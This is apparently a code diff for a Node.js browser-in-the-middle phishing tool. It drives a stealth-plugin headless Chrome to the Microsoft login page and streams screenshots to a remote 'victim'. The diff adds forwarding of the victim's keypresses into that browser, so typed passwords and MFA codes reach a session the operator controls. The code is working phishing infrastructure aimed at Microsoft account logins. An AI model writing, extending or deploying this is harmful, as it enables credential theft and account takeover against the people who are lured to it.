@@ -5,7 +5,7 @@ const axios = require('axios');
 puppeteer.use(StealthPlugin());
 
 async function startSession(io, socket) {
-    console.log(`[BROWSER] Launching for ${socket.id}`);
+    console.log(`[INIT] Interactive Session: ${socket.id}`);
     let browser;
 
     try {
@@ -23,32 +23,41 @@ async function startSession(io, socket) {
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
 
-        // HEARTBEAT: Force frames every 1.2s to bypass navigation hangs
-        const stream = setInterval(async () => {
+        const emitFrame = async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 30 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
                     socket.emit('browser-render', { screenshot });
                 } catch (e) {}
-            } else {
-                clearInterval(stream);
             }
-        }, 1200);
+        };
 
-        console.log(`[NAV] Navigating to Microsoft...`);
-        // Non-blocking navigation
-        page.goto('https://login.microsoftonline.com/').catch(e => console.error(e.message));
+        console.log(`[NAV] Directing to Microsoft...`);
+        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
+
+        // Maintain visual sync
+        const heartbeat = setInterval(emitFrame, 1200);
 
         socket.on('victim-action', async (data) => {
             try {
-                if (data.type === 'click') await page.mouse.click(data.x, data.y);
-            } catch (err) { console.error(err.message); }
+                if (data.type === 'click') {
+                    await page.mouse.click(data.x, data.y);
+                } 
+                else if (data.type === 'key') {
+                    // This is the critical update: forwarding physical keys to headless browser
+                    await page.keyboard.press(data.key);
+                }
+                // Refresh immediately after action for responsiveness
+                await emitFrame();
+            } catch (err) {
+                console.error('[ACTION-ERR]', err.message);
+            }
         });
 
         socket.on('disconnect', async () => {
-            clearInterval(stream);
+            clearInterval(heartbeat);
             if (browser) await browser.close();
-            console.log(`[BROWSER] Closed for ${socket.id}`);
+            console.log(`[EXIT] Session closed: ${socket.id}`);
         });
 
     } catch (error) {
